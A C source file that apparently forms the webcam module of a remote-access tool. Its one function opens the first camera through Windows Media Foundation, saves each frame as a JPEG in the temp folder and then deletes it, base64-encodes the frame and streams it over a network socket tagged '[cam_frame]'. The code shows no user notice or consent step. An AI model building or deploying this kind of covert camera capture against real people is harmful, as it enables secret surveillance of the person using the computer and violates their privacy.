#include "camera.h"
#include "stb_image_write.h"
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <stdio.h>

#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "ole32.lib")

void camera_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
    int interval = 1000 / (fps > 0 ? fps : 1);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET);

    IMFAttributes* pConfig = NULL;
    MFCreateAttributes(&pConfig, 1);
    pConfig->lpVtbl->SetGUID(pConfig, &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);

    IMFActivate** ppDevices = NULL;
    UINT32 count = 0;
    MFEnumDeviceSources(pConfig, &ppDevices, &count);

    if (count == 0) {
        if (pConfig) pConfig->lpVtbl->Release(pConfig);
        MFShutdown();
        CoUninitialize();
        return;
    }

    IMFMediaSource* pSource = NULL;
    ppDevices[0]->lpVtbl->ActivateObject(ppDevices[0], &IID_IMFMediaSource, (void**)&pSource);

    IMFSourceReader* pReader = NULL;
    MFCreateSourceReaderFromMediaSource(pSource, NULL, &pReader);

    // Select RGB24 output
    IMFMediaType* pType = NULL;
    MFCreateMediaType(&pType);
    pType->lpVtbl->SetGUID(pType, &MF_MT_MAJOR_TYPE, &MF_MT_VIDEO);
    pType->lpVtbl->SetGUID(pType, &MF_MT_SUBTYPE, &MF_SDK_VIDEO_MS_RGB24);
    pReader->lpVtbl->SetCurrentMediaType(pReader, (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
    pType->lpVtbl->Release(pType);

    while (WaitForSingleObject(stop_event, interval) == WAIT_TIMEOUT) {
        DWORD streamIndex, flags;
        LONGLONG timestamp;
        IMFSample* pSample = NULL;
        pReader->lpVtbl->ReadSample(pReader, (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &timestamp, &pSample);

        if (pSample) {
            IMFMediaBuffer* pBuffer = NULL;
            pSample->lpVtbl->GetBufferByIndex(pSample, 0, &pBuffer);
            BYTE* pData = NULL;
            DWORD cbData = 0;
            pBuffer->lpVtbl->Lock(pBuffer, &pData, NULL, &cbData);

            // Get width/height
            IMFMediaType* pCurType = NULL;
            pReader->lpVtbl->GetCurrentMediaType(pReader, (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCurType);
            UINT32 w, h;
            MFGetAttributeSize(pCurType, &MF_MT_FRAME_SIZE, &w, &h);
            pCurType->lpVtbl->Release(pCurType);

            char tmp[MAX_PATH];
            GetTempPathA(MAX_PATH, tmp);
            strcat(tmp, "cam.jpg");
            stbi_write_jpg(tmp, w, h, 3, pData, 60);

            pBuffer->lpVtbl->Unlock(pBuffer);
            pBuffer->lpVtbl->Release(pBuffer);
            pSample->lpVtbl->Release(pSample);

            FILE* f = fopen(tmp, "rb");
            if (f) {
                fseek(f, 0, SEEK_END);
                long size = ftell(f);
                fseek(f, 0, SEEK_SET);
                unsigned char* jpg_data = malloc(size);
                fread(jpg_data, 1, size, f);
                fclose(f);
                DeleteFileA(tmp);

                size_t b64_len;
                char* b64 = base64_encode(jpg_data, size, &b64_len);
                free(jpg_data);

                char* msg = malloc(b64_len + 32);
                sprintf(msg, "[cam_frame]%s", b64);
                sock_send(sock, mutex, msg);
                free(msg); free(b64);
            }
        }
    }

    pReader->lpVtbl->Release(pReader);
    pSource->lpVtbl->Release(pSource);
    for (UINT32 i = 0; i < count; i++) ppDevices[i]->lpVtbl->Release(ppDevices[i]);
    CoTaskMemFree(ppDevices);
    if (pConfig) pConfig->lpVtbl->Release(pConfig);
    MFShutdown();
    CoUninitialize();
}
